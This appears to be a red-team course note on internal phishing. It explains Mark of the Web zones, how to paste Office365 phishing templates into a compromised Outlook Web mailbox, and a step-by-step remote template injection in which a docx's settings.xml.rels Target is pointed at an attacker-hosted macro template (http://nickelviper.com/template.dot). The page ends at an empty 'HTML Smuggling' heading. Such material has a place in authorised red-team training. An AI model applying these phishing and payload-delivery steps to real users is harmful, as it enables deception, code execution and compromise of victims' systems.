# Internal Phishing

### Initial Access Payloads

One significant difference (apart from how you dress it up to the user), is that any file downloaded via a browser (outside of a trusted zone) will be tainted with the "Mark of the Web" (MOTW). In a nutshell, this is a data stream that gets embedded into the file which says it was downloaded from an untrusted location. The zone data can be read with PowerShell.

```powershell
gc .\test.txt -Stream Zone.Identifier
[ZoneTransfer]
ZoneId=3
HostUrl=http://nickelviper.com/test.txt
```

The possible zones are:

* 0 => Local computer
* 1 => Local intranet
* 2 => Trusted sites
* 3 => Internet
* 4 => Restricted sites

Files with MOTW are handled with additional security scrutiny - you may be familiar with both Windows SmartScreen and Office Protected View.  They often don't stop files from being opened or executed, but they require the user to click through more warning boxes which lower the likelihood of your phish being successful.  If MS Office "block macros downloaded from the Internet" is enabled, a user cannot run a macro-enabled document even if they wanted to.  This will soon be the default setting.

Files that are emailed "internally" via a compromised Exchange mailbox are not tagged with a Zone Identifier.

### Phishing Templates

https://github.com/ZeroPointSecurity/PhishingTemplates/tree/master/Office365

1. Open one of them, e.g. `Word.html` in Edge or another browser.  Then do is `Ctrl + A` and `Ctrl + C` to copy the content; and then `Ctrl + V` to paste it directly into the OWA text editor.  All the text and image formatting should be preserved.
2. You can change the text placeholders and URL to the payload on lines 160, 183, 192, 197, and 207.  My payload URL will be `http://domain.com/ProductReport.doc`.

<figure><img src="../../.gitbook/assets/doc-phish.webp" alt=""><figcaption></figcaption></figure>

## Remote Template Injection

https://github.com/JohnWoodman/remoteinjector

Microsoft Word has the option of creating new documents from a template.  Office has some templates pre-installed, you can make custom templates, and even download new ones.  Remote Template Injection is a technique where an attacker sends a benign document to a victim, which downloads and loads a malicious template.  This template may hold a macro, leading to code execution.

1. Open Word on the Attacker Desktop, create a new blank document and insert your desired macro.  Save this to `C:\Payloads` as a Word 97-2003 Template (\*.dot) file.  This is now our "malicious remote template".  Use Cobalt Strike to host this file at `http://domain.com/template.dot`.
2. Next, create a new document from the blank template located in `C:\Users\Attacker\Documents\Custom Office Templates`.  Add any content you want, then save it to `C:\Payloads` as a new .docx. &#x20;
3. Browse to the directory in explorer, right-click and select `7-Zip` _>_ `Open archive`.  Navigate to _word >_ `_rels`, right-click on `settings.xml.rels` and select `Edit`.
4. This is just a small XML file.  Scroll right until you see the _Target_ entry.

{% code overflow="wrap" %}
```powershell
Target="file:///C:\Users\Attacker\Documents\Custom%20Office%20Templates\Blank%20Template.dotx"
```
{% endcode %}

5. It's currently pointing to the template on our local disk from which the document was created. Simply modify this so it points to the template URL instead.

```powershell
Target="http://nickelviper.com/template.dot"
```

## HTML Smuggling

